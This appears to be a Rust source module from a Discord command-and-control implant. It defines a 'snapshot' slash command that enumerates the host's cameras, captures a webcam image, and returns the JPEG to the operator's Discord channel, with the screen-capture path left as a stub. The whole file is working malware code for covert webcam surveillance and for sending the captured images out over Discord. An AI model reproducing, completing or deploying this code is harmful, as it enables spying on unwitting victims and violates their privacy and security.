use std::borrow::Cow;
use chrono::Utc;
use nokhwa::utils::CameraIndex;
use serenity::builder::CreateApplicationCommand;
use serenity::model::application::command::CommandOptionType;
use serenity::model::application::interaction::application_command::{CommandDataOption, CommandDataOptionValue};
use serenity::model::channel::AttachmentType;
use crate::errors::DiscordC2Error;
use crate::libraries::nokhwa_wrapper::wrapper;

pub fn register(command: &mut CreateApplicationCommand) -> &mut CreateApplicationCommand {
    let cameras = wrapper::list_devices().unwrap();

    // Create the snapshot command.
    let snapshot_command = command
        .name("snapshot")
        .description("Grabs a snapshot from the screen or the camera");

    // Create the sub-command group.
    snapshot_command
        .create_option(|option|
            option
                .name("type")
                .description("Type of snapshot to grab")
                .kind(CommandOptionType::SubCommandGroup)
                .create_sub_option(|sub_command|
                    sub_command
                        .name("screen")
                        .description("Take a snapshot of the screen")
                        .kind(CommandOptionType::SubCommand)
                )
                .create_sub_option(|sub_command| {
                    let mut camera_option = sub_command
                        .name("camera")
                        .description("Take a snapshot from a camera")
                        .kind(CommandOptionType::SubCommand);

                    camera_option = camera_option.create_sub_option(|option| {
                        let mut camera_list_option = option
                            .name("camera_list")
                            .description("Choose a camera from the list")
                            .kind(CommandOptionType::Integer)
                            .required(true);

                        // Add integer choices to the camera list option based on the number of cameras.
                        for i in 0..cameras.len() {
                            camera_list_option = camera_list_option.add_int_choice(format!("{} ({})", &cameras[i].human_name(), &cameras[i].description()), i as i32);
                        }

                        camera_list_option
                    });

                    camera_option
                })
        );

    command
}


pub async fn run(options: &[CommandDataOption]) -> Result<Option<AttachmentType>, DiscordC2Error> {
    let option = options
        .get(0)
        .ok_or_else(|| DiscordC2Error::InvalidInput("Expected snapshot type.".to_string()))?
        .options.to_vec();

    // Match the first option, which contains the snapshot type.
    if let Some(snapshot_type_option) = option.get(0) {
        match snapshot_type_option.name.as_str() {
            "screen" => Ok(None),
            "camera" => {
                if let Some(camera_option) = snapshot_type_option.options.get(0) {
                    if let Some(CommandDataOptionValue::Integer(camera_index)) = camera_option.resolved {
                        Ok(Some(process_camera_option(CameraIndex::Index(camera_index as u32))?))
                    } else {
                        Err(DiscordC2Error::InvalidInput("Invalid camera_list value.".to_string()))
                    }
                } else {
                    Err(DiscordC2Error::InvalidInput("Camera option not found.".to_string()))
                }
            }
            _ => {
                println!("Invalid snapshot type: {}", snapshot_type_option.name);
                Err(DiscordC2Error::InvalidInput("Invalid snapshot type.".to_string()))
            }
        }
    } else {
        Err(DiscordC2Error::InvalidInput("Snapshot type option not found.".to_string()))
    }
}

fn process_camera_option(index: CameraIndex) -> Result<AttachmentType<'static>, DiscordC2Error> {
    let camera = wrapper::init_static_cam(index)?;
    let snapshot_bytes = wrapper::snapshot(camera)?;

    let attachment = AttachmentType::Bytes {
        data: Cow::from(snapshot_bytes),
        filename: format!("screenshot{}.jpeg", Utc::now()),
    };

    Ok(attachment)
}

fn _process_screen_option(_option: &CommandDataOption) -> String {
    "".to_string()
}
